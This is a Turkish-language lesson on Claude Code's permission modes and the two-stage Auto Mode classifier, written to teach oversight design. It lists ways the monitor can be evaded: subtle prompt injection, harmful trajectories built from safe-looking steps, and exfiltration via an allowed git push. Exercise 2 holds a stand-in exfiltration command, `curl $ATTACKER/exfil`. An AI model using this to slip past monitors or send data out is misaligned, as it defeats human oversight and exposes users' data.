# Claude Code Otonom Agent Olarak: İzin Modları ve Auto Mode

> Claude Code yedi izin modu (permission mode) sunar. "plan" her eylemden önce sorar, "default" yalnızca riskli olanlar için sorar, "acceptEdits" dosya yazılarını otomatik onaylar ancak kabuk (shell) çalıştırmayı hâlâ doğrular ve "bypassPermissions" her şeyi onaylar. Auto Mode (24 Mart 2026) eylem başına onayı, iki aşamalı paralel bir sınıflandırıcıyla (classifier) değiştirir: tek token'lı hızlı bir kontrol her eylemde çalıştırılır; işaretlenen eylemler düşünce zinciri (chain-of-thought) derinlemesine incelemeye yükseltilir. Eylem bütçeleri `max_turns` ve `max_budget_usd` ile uygulanır. Auto Mode araştırma önizlemesi (research preview) olarak yayınlandı — Anthropic, sınıflandırıcının tek başına yeterli olmadığını açıkça belirtti.

**Tür:** Öğrenme
**Diller:** Python (stdlib, iki aşamalı sınıflandırıcı simülatörü)
**Önkoşullar:** Faz 15 · 01 (Uzun vadeli agentlar), Faz 15 · 09 (Kodlama agentı peyzajı)
**Süre:** ~45 dakika

## Sorun

Makinenizdeki bir otonom kodlama agentı, belirgin bir güvenlik kategorisidir. Saldırı yüzeyi (attack surface), agent'ın ulaşabildiği her şeydir — dosya sistemi, ağ, kimlik bilgileri (credentials), pano (clipboard), herhangi bir tarayıcı sekmesi, herhangi bir açık terminal. Bruce Schneier ve diğerleri bunu kamuoyuna işaret etti: bilgisayar-kullanan agentlar (computer-use agents) sohbet botlarının "özellik güncellemesi" değildir, yeni bir risk profiline sahip yeni bir araç türüdür.

Claude Code'nun izin sistemi, Anthropic'in yanıtıdır. Tek bir "otonom / otonom değil" anahtarı yerine, bir yetenek merdiveni (capability ladder) üzerine yedi mod vardır: plan → default → acceptEdits → … → bypassPermissions. Her mod hız ve eylem-başına inceleme arasında farklı bir takastır. Auto Mode (Mart 2026), sınıflandırıcının güvenli bulduğu eylemler için onayı kullanıcının kritik yolundan (critical path) kaldırırken, işaretlediği eylemler için bir inceleme katmanını koruyan iki aşamalı bir sınıflandırıcı ekler.

Mühendislik sorusu: bu sistem neyi yakalıyor, neyi kaçırıyor ve belirli bir görev aslında hangi modu gerektiriyor?

## Kavram

### Yedi izin modu

| Mod | Davranış | Ne zaman kullanılır |
|---|---|---|
| `plan` | Agent bir plan önerir; kullanıcı tüm planı onaylar; her eylem çalıştırmadan önce incelenir | Tanınmamış görev; üretime yakın kod; bir depoda ilk kez agent kullanımı |
| `default` | Agent eylemleri çalıştırır; "riskli" herhangi bir eylem için kullanıcıya sorar (kabuk çalıştırma, yıkıcı işlemler, ağ çağrısı) | Çoğu etkileşimli kodlama oturumu |
| `acceptEdits` | Dosya yazıları otomatik onaylanır; kabuk çalıştırma ve ağ çağrısı hâlâ sorar | Birçok dosya genelinde düzenleme geçişi (refactoring pass) |
| `acceptExec` | Kabuk komutları düzenlenmiş bir izin listesi (allowlist) içinde otomatik onaylanır; yazılar otomatik onaylanır | Her kabuk komutunun `npm test` veya benzeri olduğu sıkı iç döngüler |
| `autoMode` | İki aşamalı güvenlik sınıflandırıcısı; işaretlenen eylemler incelemeye yükseltilir | Kısıtlı bir çalışma alanında uzun vadeli gözetimsiz çalışmalar |
| `yolo` | Çoğu isteği atlar; araç izin listesi / reddetme listesini (denylist) hâlâ çalıştırır | Geçici sandbox'lar, CI işleri, araştırma betikleri |
| `bypassPermissions` | Her şeyi onaylar | "Yalnızca atabileceğiniz geçici kapsayıcılarda" olarak belgelenmiştir |

(Yukarıdaki isimler, herkese açık Claude Code dokümanlarıyla eşleşir; "yolo", izin verici orta zemin için gayri resmi kısaltmadır.)

### Auto Mode bir sayfada

Auto Mode (24 Mart 2026'da başlatıldı), eylem-başına onayı bir modele devreden ilk izin modudur. Yapı:

1. **Aşama 1 — tek token'lı sınıflandırıcı.** Her önerilen eylemde çalıştırılır. Ucuzdur. "Güvenli" veya "işaretli" döndürür. Ana agent döngüsüyle paralel çalışacak şekilde tasarlanmıştır, böylece onaylanan eylemler kuyrukta beklemez.
2. **Aşama 2 — ikincil politika/güvenlik incelemesi.** Yalnızca işaretli eylemlerde çalıştırılır. Eylem, oturumun mevcut durumu ve beyan edilen görev üzerinde odaklanmış bir politika ve güvenlik değerlendirmesi yapar. Güven düşükse kullanıcı HITL'e (insan-döngüde) yükseltir.

Bütçe kontrolleri sınıflandırıcının yanında yer alır:

- `max_turns` — bir oturumdaki toplam iterasyon sayısı.
- `max_budget_usd` — oturumu iptal eden dolar tavanı.
- Araç başına eylem sayısı sınırları (bir araç için en fazla N `WebFetch` çağrısı, vb.).

### Sistem neyi yakalar

- Araç girdilerine doğrudan prompt enjeksiyonu (prompt injection) — enjekte edilen talimatın bilinen-riskli bir eylem形状ına (shape) eşleştiği durumlar.
- Tekrarlayan araç döngüleri — sınıflandırıcı, eylem N+1'in eylem N ile neredeyse aynı olduğunu, beş kez üst üste görebilir.
- Aksi takdirde yalnızca dosya düzenleme olan bir oturumda bariz kapsam-dışı kabuk komutları.

### Sistem neyi kaçırabilir

- **İnceliği olan prompt enjeksiyonu** — tek bir işaretli eylem üretmeden davranışı modüle eden. Dolaylı prompt enjeksiyonu (indirect prompt injection), tam olarak yamalanamayan bir güvenlik açığıdır (OpenAI hazırlık başkanı, 2025, tarayıcı agentları hakkında — Ders 11'e bakın).
- **Anlamsal düzeyde kötü davranış.** Her bireysel eylem güvenli görünürken, birleştirilmiş yörünge (trajectory) zararlı olabilir. Sınıflandırıcı eylemi değerlendirir; kullanıcının niyetini yeniden çıkarmaz.
- **Meşru kanallar aracılığıyla veri sızıntısı (exfiltration).** Size ait bir dosyaya veri yazıp ardından herkese açık bir depoya `git push` yapmak, izin verilmiş eylemlerden oluşan ancak bileşimi sorunlu bir dizidir.

### Araştırma önizlemesi çerçevesi

Anthropic, Auto Mode'u araştırma önizlemesi olarak yayınladı. Dokümantasyon, sınıflandırıcının bir katman olduğunu, çözüm olmadığını açıkça belirtir: kullanıcıların Auto Mode'u bütçeler, izin listeleri, izole çalışma alanları ve yörünge denetimleriyle (Lessons 12–16) birleştirmesi beklenir. Önizleme çerçevesi, ayrıca belgelenmiş değerlendirme-dağıtım (eval-vs-deploy) boşluğunu da yansıtır (Ders 1) — çevrimdışı değerlendirmeleri geçen bir sınıflandırıcı, kullanıcının bağlamının belirsiz olduğu gerçek bir oturumda farklı davranabilir.

### Bu merdiven iş akışınızda nerede durur

- Tanınmamış görev: `plan` ile başlayın. Planı okumak, kötü bir çalışmayı geri almaktan daha ucuzdur.
- Bilinen düzenleme: `acceptEdits` çok fazla onay tıklamasından tasarruf sağlar.
- Gözetimsiz arka plan çalışması: `autoMode` yalnızca patlama yarıçapını (blast radius) ölçmüş bir çalışma alanında (kimlik bilgileri yok, üretim bağlama (mount) yok, opted-in olmadığınız çıkış (egress) yok).
- Geçici kapsayıcılar (containers): `yolo` / `bypassPermissions`, yalnızca kapsayıcının ve kimlik bilgilerinin atılabilir (disposable) olması durumunda kabul edilebilir.

## Kullan

`code/main.py`, iki aşamalı sınıflandırıcıyı simüle eder. Aşama 1, önerilen eylemler üzerinde ucuz bir anahtar kelime kuralıdır; Aşama 2, daha yavaş çok kurallı bir incelemeci (reviewer)'dir. Sürücü kısa sentetik bir yörünge besler (güvenli eylemler, bir prompt enjeksiyonu denemesi, tekrarlayan bir döngü) ve sınıflandırıcının nerede yakaladığını, nerede kaçırdığını gösterir.

## Üret

`outputs/skill-permission-mode-picker.md`, bir görev tanımını doğru izin modu, bütçe tavanları ve gerekli izolasyonla eşleştirir.

## Alıştırmalar

1. `code/main.py` dosyasını çalıştırın. Hangi sentetik eylem türü Aşama 1 tarafından hiç işaretlenmez ancak Aşama 2 tarafından her zaman yakalanır? Hangisi hiçbir tarafından yakalanmaz?

2. Aşama 1 kural kümesini belirli bir bilinen-kötü形状ını yakalayacak şekilde genişletin (ör. `curl $ATTACKER/exfil`). İyi niyetli eylem örneği üzerinde yanlış-pozitif (false-positive) oranını ölçün.

3. Anthropic'in "Agent döngüsü nasıl çalışır" dokümanını okuyun. `default` modunda agent'ın varsayılan olarak dokunduğu her harici durumu listeleyin. `autoMode`'u gözetimsiz çalıştırmadan önce hangilerini ayrıca denetlemeniz gerekir?

4. 24 saatlik gözetimsiz bir çalışma bütçesi tasarlayın: `max_turns`, `max_budget_usd`, araç başına tavanlar, izin listeleri. Her sayıyı gerekçelendirin.

5. Her bireysel eylemin Aşama 1 ve Aşama 2 tarafından onaylandığı, ancak birleştirilmiş davranışın uyumsuz (misaligned) olduğu bir yörünge tanımlayın. (Ders 14, durdurma anahtarlarının (kill switches) ve kanarya token'larının (canary tokens) bunu nasıl ele aldığını kapsar.)

## Anahtar Terimler

| Terim | Ne Söyleniyor | Aslında Ne Anlama Geliyor |
|---|---|---|
| İzin modu (Permission mode) | "Agent'ın ne yapabileceği" | Eylem-başına onayı kontrol eden yedi adlandırılmış politikadan biri |
| plan modu | "Her şeyden önce sor" | Agent bir plan yazar; kullanıcı çalıştırmadan önce onaylar |
| acceptEdits | "Dosya yazmasına izin ver" | Dosya yazıları otomatik onaylanır; kabuk çalıştırma hâlâ sorar |
| autoMode | "Otomatik onaylar" | İki aşamalı güvenlik sınıflandırıcısı; işaretlenen eylemler yükseltilir |
| bypassPermissions | "Tam YOLO" | Her şeyi onaylar; geçici kapsayıcılar için tasarlanmıştır |
| Aşama 1 sınıflandırıcısı (Stage 1 classifier) | "Hızlı token kontrolü" | Önerilen eylem üzerinde tek token kuralı; paralel çalışır |
| Aşama 2 sınıflandırıcısı (Stage 2 classifier) | "Derin inceleme" | İşaretli eylemler üzerinde düşünce zinciri (chain-of-thought) akıl yürütmesi |
| Araştırma önizlemesi (Research preview) | "GA değil" | Hata modu hâlâ haritalanan özellikler için Anthropic çerçevesi |

## İleri Okuma

- [Anthropic — Agent döngüsü nasıl çalışır](https://code.claude.com/docs/en/agent-sdk/agent-loop) — izin modları, bütçeler, eylem biçimi.
- [Anthropic — Claude Yönetilen Agentlar genel bakışı](https://platform.claude.com/docs/en/managed-agents/overview) — yönetilen hizmet çalışmatırma modeli.
- [Anthropic — Claude Code ürün sayfası](https://www.anthropic.com/product/claude-code) — özellik yüzeyi ve Auto Mode duyurusu.
- [Anthropic — Claude'un Anayasası (Ocak 2026)](https://www.anthropic.com/news/claudes-constitution) — sınıflandırıcı yargılarını şekillendiren akla dayalı katman.
- [Anthropic — Pratikte Agent Otonomunu Ölçme](https://www.anthropic.com/research/measuring-agent-autonomy) — uzun vadeli izin tasarımı hakkında iç bakış.
